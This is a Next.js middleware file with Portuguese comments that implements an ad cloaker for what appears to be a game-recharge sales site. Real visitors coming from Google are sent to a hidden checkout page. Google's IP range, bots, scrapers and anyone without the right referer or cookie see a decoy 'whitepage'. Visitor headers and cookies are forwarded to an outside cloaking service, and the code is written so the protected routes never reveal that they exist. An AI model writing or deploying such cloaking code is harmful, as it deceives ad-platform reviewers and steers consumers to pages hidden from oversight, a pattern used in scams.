import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
import { isBlockedBotIP } from '@/lib/bot-ips'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID 
    ? `https://www.altercpa.one/fltr/${process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID}`
    : null,
  enabled: process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true' && !!process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  const referer = request.headers.get('referer') || ''
  
  // Filtrar logs de assets estáticos e rotas irrelevantes
  const isStaticAsset = pathname.startsWith('/images/') || 
                        pathname.startsWith('/fonts/') || 
                        pathname.startsWith('/_next/') ||
                        pathname.includes('.png') ||
                        pathname.includes('.jpg') ||
                        pathname.includes('.jpeg') ||
                        pathname.includes('.webp') ||
                        pathname.includes('.svg') ||
                        pathname.includes('.woff') ||
                        pathname.includes('.woff2') ||
                        pathname.includes('.ttf') ||
                        pathname.includes('.ico') ||
                        pathname === '/manifest.json' ||
                        pathname === '/favicon.ico' ||
                        pathname === '/robots.txt' ||
                        pathname === '/sitemap.xml'
  
  // 📊 LOG ORGANIZADO: Apenas rotas importantes
  // Logar apenas: /, /recargajogo, /checkout, /sucesso
  // Excluir: /api/get-avatar (spam), /api/utmify-track (muito frequente)
  const shouldLog = !isStaticAsset && (
    pathname === '/' ||
    pathname === '/recargajogo' ||
    pathname.startsWith('/checkout') ||
    pathname.startsWith('/sucesso')
  ) && !pathname.includes('/api/get-avatar') && !pathname.includes('/api/utmify-track')
  
  if (shouldLog) {
    const clientIp = request.headers.get('cf-connecting-ip') || 
                     request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
                     request.headers.get('x-real-ip') || 
                     'unknown'
    const referer = request.headers.get('referer') || 'direto'
    const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
    
    // Não logar navegação interna repetida (quando referer é do próprio domínio)
    const requestHost = request.headers.get('host') || ''
    const isInternalNavigation = referer !== 'direto' && (
      referer.includes(requestHost) || 
      referer.includes('aprovarevolucaoweb.click') ||
      referer.includes('suamelhorcompradoano.shop') ||
      referer.includes('localhost')
    )
    
    // Logar apenas:
    // 1. Acesso externo (Google, direto, etc)
    // 2. Primeira visita (/)
    // 3. Checkout e Sucesso (sempre importante)
    const isImportantRoute = pathname === '/' || pathname.startsWith('/checkout') || pathname.startsWith('/sucesso')
    
    if (!isInternalNavigation || isImportantRoute) {
      console.log('')
      console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
      console.log('┃ 🌐 ACESSO DO USUÁRIO                    ┃')
      console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
      console.log(`📍 Rota: ${pathname}`)
      console.log(`🔑 IP: ${clientIp}`)
      console.log(`🔗 Referer: ${referer}`)
      console.log(`🍪 Cookie válido: ${hasValidCookie ? 'SIM' : 'NÃO'}`)
      console.log('')
    }
  }
  
  // ============================================
  // ✅ WHITELIST DE IPs - BYPASS TOTAL
  // ============================================
  // IPs nesta lista pulam TODAS as verificações (cloaker, cookies, etc)
  const clientIp = request.headers.get('cf-connecting-ip') || 
                   request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
                   request.headers.get('x-real-ip') || 
                   request.ip || 
                   'unknown'
  
  const whitelistedIPs = [
    '191.7.55.158',
    // Adicione mais IPs aqui conforme necessário
  ]
  
  // Whitelist: Apenas adiciona o IP à lista de permitidos
  // Mas ainda passa pelo cloaker para validação
  const isWhitelistedIP = whitelistedIPs.includes(clientIp)
  
  if (isWhitelistedIP) {
    console.log(`✅ [Whitelist] IP na whitelist: ${clientIp} - Enviando para cloaker`)
  }
  
  // ============================================
  // 🌐 ROTAS PÚBLICAS - Acesso livre sem verificações
  // ============================================
  const publicRoutes = [
    '/politica-privacidade',
    '/termos-uso',
    '/quem-somos'
    // Nota: '/' NÃO está aqui pois precisa passar pelo cloaker
  ]
  
  // Rota /sucesso ou /success requer parâmetros válidos
  const isSuccessRoute = pathname === '/sucesso' || pathname === '/success' || pathname.startsWith('/sucesso/') || pathname.startsWith('/success/')
  if (isSuccessRoute) {
    const hasTransactionId = request.nextUrl.searchParams.has('transactionId')
    const hasAmount = request.nextUrl.searchParams.has('amount')
    
    // Permitir se tiver parâmetros válidos
    if (hasTransactionId && hasAmount) {
      return NextResponse.next()
    }
    
    // Se não tiver parâmetros válidos, retornar 404
    console.log(`🚫 [Middleware] Acesso negado a ${pathname} sem parâmetros válidos`)
    return new NextResponse(null, {
      status: 404,
      statusText: 'Not Found'
    })
  }
  
  // Liberar rotas públicas
  if (publicRoutes.includes(pathname)) {
    return NextResponse.next()
  }
  
  
  // ============================================
  // 🚫 BLOQUEIO DE IPs ESPECÍFICOS - PRIORIDADE MÁXIMA
  // ============================================
  
  // clientIp já foi definido acima na whitelist
  
  // Lista de ranges de IPs bloqueados permanentemente
  const blockedIPRanges = [
    /^2001:4860:.*/  // Bloqueia todo o range 2001:4860:*
  ]
  
  // Verificar se o IP está em algum range bloqueado
  const isBlockedIP = blockedIPRanges.some(range => range.test(clientIp))
  
  if (isBlockedIP) {
    // Se tentar acessar qualquer rota que não seja a raiz, redirecionar para /
    if (pathname !== '/' && !pathname.startsWith('/_next') && !pathname.startsWith('/api')) {
      return NextResponse.redirect(new URL('/', request.url))
    }
    
    // Se estiver na raiz, mostrar a whitepage (página inicial)
    return NextResponse.next()
  }
  
  // ============================================
  // 🛡️ PROTEÇÃO CONTRA ACESSO POR IP
  // ============================================
  
  const requestHost = request.headers.get('host') || ''
  
  // Domínios permitidos do .env (separados por vírgula)
  const allowedDomainsEnv = process.env.NEXT_PUBLIC_ALLOWED_DOMAINS || ''
  const allowedDomains = [
    ...allowedDomainsEnv.split(',').map(d => d.trim()).filter(Boolean),
    'localhost:3000',
    'localhost:3001',
    'localhost:3002',
    'localhost:3003',
    'localhost:3004',
    'localhost:3051'  // ✅ Porta 3051
  ]
  
  // Bloquear se não for um domínio autorizado (acesso por IP)
  // Normalizar domínios removendo hífens para comparação flexível
  const normalizeHost = (host: string) => host.replace(/-/g, '').toLowerCase()
  const normalizedRequestHost = normalizeHost(requestHost)
  
  const isAllowedDomain = allowedDomains.some(domain => {
    const normalizedDomain = normalizeHost(domain)
    return normalizedRequestHost.includes(normalizedDomain) || requestHost.includes(domain)
  })
  
  if (allowedDomains.length > 2 && !isAllowedDomain) {
    return new NextResponse('Forbidden', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain',
        'X-Robots-Tag': 'noindex, nofollow'
      }
    })
  }
  
  // ============================================
  // 🍪 VERIFICAÇÃO DE COOKIE - Prioridade máxima
  // ============================================
  // Verificar se é localhost (para desabilitar redirecionamentos em desenvolvimento)
  const isLocalhost = requestHost.includes('localhost') || requestHost.includes('127.0.0.1')
  
  // Se o usuário já tem cookie válido, liberar acesso total a TODAS as rotas
  const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
  
  if (hasValidCookie) {
    // Se tem cookie e está na rota raiz (/), redirecionar para /recargajogo
    // EXCETO em localhost
    if ((pathname === '/' || pathname === '') && !isLocalhost) {
      if (shouldLog) {
        console.log(`🔄 [Redirect] Redirecionando de ${pathname} para /recargajogo`)
      }
      const redirectUrl = new URL('/recargajogo', request.url)
      return NextResponse.redirect(redirectUrl)
    }
    
    // Para qualquer outra rota, liberar acesso (sem log excessivo)
    return NextResponse.next()
  }
  
  // ============================================
  // 🔒 PROTEÇÃO ROTAS /recargajogo e /checkout - Apenas com cookie do cloaker
  // ============================================
  // Se chegou aqui, NÃO tem cookie válido
  
  // Log de acesso sem cookie em rotas protegidas
  if (!hasValidCookie && (pathname === '/recargajogo' || pathname.startsWith('/checkout')) && shouldLog) {
    console.log('⚠️ [Middleware] Acesso SEM COOKIE a rota protegida:', pathname)
    console.log('⚠️ [Middleware] Isso deveria mostrar WhitePage ou redirecionar')
  }
  
  // EXCETO em localhost (permitir acesso livre para desenvolvimento)
  // 
  // IMPORTANTE: NÃO retornar 404 aqui!
  // Deixar o VerificationWrapper mostrar a whitepage (200 OK)
  // Isso evita revelar que a rota existe
  
  // Rotas protegidas são tratadas pelo VerificationWrapper
  // Apenas continuar o fluxo normal
  
  // ============================================
  // 🎯 CLOAKER - Detecção de Bot vs Usuário Real
  // ============================================
  
  // Apenas na rota raiz (/) e se cloaker estiver ativado e configurado
  // Se chegou aqui, o usuário NÃO tem cookie (já verificamos acima)
  // DESABILITAR em localhost para desenvolvimento
  const shouldUseCloaker = pathname === '/' && CLOAKER_CONFIG.enabled && CLOAKER_CONFIG.url && !isLocalhost
  
  if (shouldUseCloaker) {
    // Verificar referer ANTES de chamar o cloaker
    const referer = request.headers.get('referer') || ''
    
    // IPs whitelistados SEMPRE passam pelo cloaker (mesmo sem referer do Google)
    if (!isWhitelistedIP) {
      // Para IPs normais, verificar referer
      // Se NÃO tiver referer, mostrar whitepage (não chama cloaker)
      if (!referer) {
        return NextResponse.next()
      }
      
      // Se tiver referer mas NÃO for exatamente https://www.google.com/, mostrar whitepage
      if (referer !== 'https://www.google.com/') {
        return NextResponse.next()
      }
    }
    
    // Se chegou aqui, referer é válido OU é IP whitelistado - chamar cloaker
    try {
      // Preparar dados do servidor para o cloaker
      const serverData = {
        HTTP_HOST: request.headers.get('host') || '',
        HTTP_USER_AGENT: request.headers.get('user-agent') || '',
        HTTP_ACCEPT: request.headers.get('accept') || '',
        HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
        HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
        HTTP_REFERER: request.headers.get('referer') || '',
        HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
        HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
        REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
        REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
        REQUEST_METHOD: request.method,
        SERVER_PROTOCOL: 'HTTP/1.1',
        QUERY_STRING: request.nextUrl.search.substring(1),
        HTTP_COOKIE: request.headers.get('cookie') || '',
      }
      
      // Fazer requisição para o cloaker
      const formBody = new URLSearchParams(serverData as any).toString()
      
      const cloakerResponse = await fetch(CLOAKER_CONFIG.url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
          'Accept-Encoding': 'gzip, deflate, br'
        },
        body: formBody
      })

      const responseText = await cloakerResponse.text()
      
      // LOG: Resposta RAW do cloaker
      console.log('📡 [Cloaker] Status HTTP:', cloakerResponse.status)
      console.log('📄 [Cloaker] Resposta RAW:', responseText)
      console.log('📏 [Cloaker] Tamanho da resposta:', responseText.length, 'bytes')
      
      if (responseText && responseText.trim()) {
        try {
          const result = JSON.parse(responseText)
          console.log('📥 [Cloaker] JSON parseado:', JSON.stringify(result, null, 2))
          console.log('🎯 [Cloaker] Tipo detectado:', result.type)
          
          // Se for "black" (usuário real), apenas setar cookie
          // O cloaker já retorna a URL de redirect no result.url
          if (result.type === 'black') {
            console.log('')
            console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
            console.log('┃ ✅ CLOAKER: USUÁRIO REAL (BLACK)        ┃')
            console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
            console.log('🔄 URL do cloaker:', result.url || 'N/A')
            console.log('🍪 Cookie setado: _x9f2w8k5=true')
            console.log('')
            
            // Usar a URL que o cloaker retornou
            const redirectUrl = result.url || '/recargajogo'
            
            const response = NextResponse.redirect(new URL(redirectUrl, request.url))
            response.cookies.set('_x9f2w8k5', 'true', {
              httpOnly: false,
              secure: true,
              sameSite: 'lax',
              maxAge: 60 * 60 * 24 // 24 horas
            })
            
            return response
          } else {
            console.log('')
            console.log('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
            console.log('┃ 🤖 CLOAKER: BOT/WHITE DETECTADO        ┃')
            console.log('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
            console.log('📍 Tipo:', result.type)
            console.log('📄 Mostrando: Whitepage (página inicial)')
            console.log('')
          }
        } catch (parseError) {
          console.error('❌ [Cloaker] Erro ao parsear JSON:', parseError)
          console.log('📄 [Cloaker] Texto que falhou:', responseText.substring(0, 500))
        }
      } else {
        console.log('⚠️ [Cloaker] Resposta vazia ou inválida')
      }
    } catch (error) {
      console.error('❌ [Cloaker] Erro na requisição:', error)
      // Em caso de erro, deixar passar (fail-safe)
    }
  }
  
  // ============================================
  // 🛡️ PROTEÇÃO ANTI-SCRAPING
  // ============================================
  
  const userAgent = request.headers.get('user-agent') || ''
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
             request.headers.get('x-real-ip') || 
             'unknown'
  
  // Lista de user-agents de bots/scrapers conhecidos
  const blockedUserAgents = [
    'python-requests',
    'axios',
    'curl',
    'wget',
    'scrapy',
    'selenium',
    'puppeteer',
    'playwright',
    'headless',
    'bot',
    'crawler',
    'spider',
    'scraper',
    'postman',
    'insomnia',
    'httpie',
    'node-fetch',
    'got',
    'superagent',
    'undici',
    'serper',
    'scrapingbee',
    'brightdata',
    'oxylabs',
    'scraperapi',
    'apify',
    'phantomjs',
    'casperjs',
    'nightmare'
  ]
  
  // Headers suspeitos de serviços de scraping
  const suspiciousHeaders = [
    'x-api-key',
    'x-scraper-key',
    'x-brightdata-key',
    'x-oxylabs-key'
  ]
  
  // Verificar headers suspeitos
  const hasSuspiciousHeaders = suspiciousHeaders.some(header => 
    request.headers.has(header)
  )
  
  // Lista de bots permitidos (Google, Bing, etc.)
  const allowedBots = [
    'googlebot',
    'bingbot',
    'slurp', // Yahoo
    'duckduckbot',
    'baiduspider',
    'yandexbot',
    'facebookexternalhit',
    'twitterbot',
    'whatsapp',
    'telegrambot'
  ]
  
  // Verificar se é um bot permitido
  const isAllowedBot = allowedBots.some(bot => 
    userAgent.toLowerCase().includes(bot.toLowerCase())
  )
  
  // Verificar se é um bot/scraper conhecido (mas não permitido)
  const isBot = !isAllowedBot && blockedUserAgents.some(bot => 
    userAgent.toLowerCase().includes(bot.toLowerCase())
  )
  
  // Verificar se não tem user-agent (suspeito)
  const hasNoUserAgent = !userAgent || userAgent.trim() === ''
  
  // IMPORTANTE: Se cloaker está ativo, DEIXAR ELE DECIDIR sobre bots
  // Apenas bloquear scrapers em rotas que não são gerenciadas pelo cloaker
  const publicPaths = ['/api/', '/_next/', '/favicon.ico', '/robots.txt', '/sitemap.xml']
  const isPublicPath = publicPaths.some(path => pathname.startsWith(path))
  
  // Rotas gerenciadas pelo cloaker - não bloquear bots aqui
  // Apenas a raiz (/) passa pelo cloaker, /recarga só verifica cookie
  const cloakerManagedPaths = ['/']
  const isCloakerManaged = CLOAKER_CONFIG.enabled && cloakerManagedPaths.some(path => 
    pathname === path
  )
  
  // Apenas bloquear scrapers maliciosos em rotas não gerenciadas pelo cloaker
  if (!isPublicPath && !isCloakerManaged && (isBot || hasSuspiciousHeaders)) {
    // Retornar página vazia ou erro 403
    return new NextResponse(
      JSON.stringify({ 
        error: 'Access denied',
        message: 'Automated access is not permitted',
        code: 'SCRAPING_BLOCKED'
      }),
      { 
        status: 403,
        headers: { 
          'Content-Type': 'application/json',
          'X-Robots-Tag': 'noindex, nofollow'
        }
      }
    )
  }
  
  // Analytics desabilitado para desenvolvimento
  // Registrar acesso no analytics (não-bloqueante)
  // if (!pathname.startsWith('/_next') && !pathname.startsWith('/api/s7k2m9p4') && pathname !== '/x9f2w8k5') {
  //   try {
  //     const userAgent = request.headers.get('user-agent') || ''
  //     const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || request.headers.get('x-real-ip') || 'unknown'
  //     const referer = request.headers.get('referer') || ''
  //     const query = request.nextUrl.search
  //     
  //     // Fazer requisição assíncrona sem aguardar
  //     fetch(`${request.nextUrl.origin}/api/s7k2m9p4`, {
  //       method: 'POST',
  //       headers: { 'Content-Type': 'application/json' },
  //       body: JSON.stringify({
  //         path: pathname,
  //         userAgent,
  //         ip,
  //         referer,
  //         query,
  //         timestamp: Date.now()
  //       })
  //     }).catch(() => {}) // Ignorar erros silenciosamente
  //   } catch (error) {
  //     // Ignorar erros de analytics
  //   }
  // }
  
  // ============================================
  // 🔒 SISTEMA DE REFERER WHITELIST (Cloaker Interno)
  // ============================================
  
  // Em produção, NUNCA liberar localhost (previne bypass com curl)
  if (isLocalhost && process.env.NODE_ENV === 'development') {
    return NextResponse.next()
  }
  
  // ============================================
  // 🔓 ACESSO LIVRE - SEM VERIFICAÇÕES
  // ============================================
  
  // Liberar acesso total - sem verificação de cookies, referer ou subdomain
  // Controle de acesso é feito no client-side via cookies
  const response = NextResponse.next()
  
  // ============================================
  // 🔒 CABEÇALHOS DE SEGURANÇA
  // ============================================
  
  // Content Security Policy (CSP) - Proteção contra XSS
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com https://www.google-analytics.com https://googleads.g.doubleclick.net https://cdn.jsdelivr.net https://unpkg.com https://static.cloudflareinsights.com https://cdn.utmify.com.br https://jsdelivr.b-cdn.net;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.googletagmanager.com;
    img-src 'self' data: https: blob:;
    font-src 'self' data: https://fonts.gstatic.com;
    connect-src 'self' https://www.google-analytics.com https://www.googletagmanager.com https://www.google.com https://googleads.g.doubleclick.net https://www.googleadservices.com https://cloudflareinsights.com https://*.altercpa.one https://*.mercadopago.com https://*.mercadopago.com.br https://cdn.utmify.com.br https://*.utmify.com.br https://serverless-benchmarks-js.compute-pipe.com https://ptcfc.com https://jsdelivr.b-cdn.net https://*.cedexis-test.com;
    frame-src 'self' https://www.googletagmanager.com https://www.mercadopago.com https://www.mercadopago.com.br;
    object-src 'none';
    base-uri 'self';
    form-action 'self' https://www.mercadopago.com https://www.mercadopago.com.br;
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, ' ').trim()
  
  response.headers.set('Content-Security-Policy', cspHeader)
  
  // HSTS - HTTP Strict Transport Security (força HTTPS)
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  )
  
  // COOP - Cross-Origin-Opener-Policy (isolamento de janela)
  response.headers.set('Cross-Origin-Opener-Policy', 'same-origin')
  
  // X-Frame-Options removido para permitir iframes
  
  // X-Content-Type-Options - Previne MIME sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff')
  
  // Referrer-Policy - Controla informações de referer
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  
  // Permissions-Policy - Controla features do browser
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), interest-cohort=()'
  )
  
  return response
}



// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}
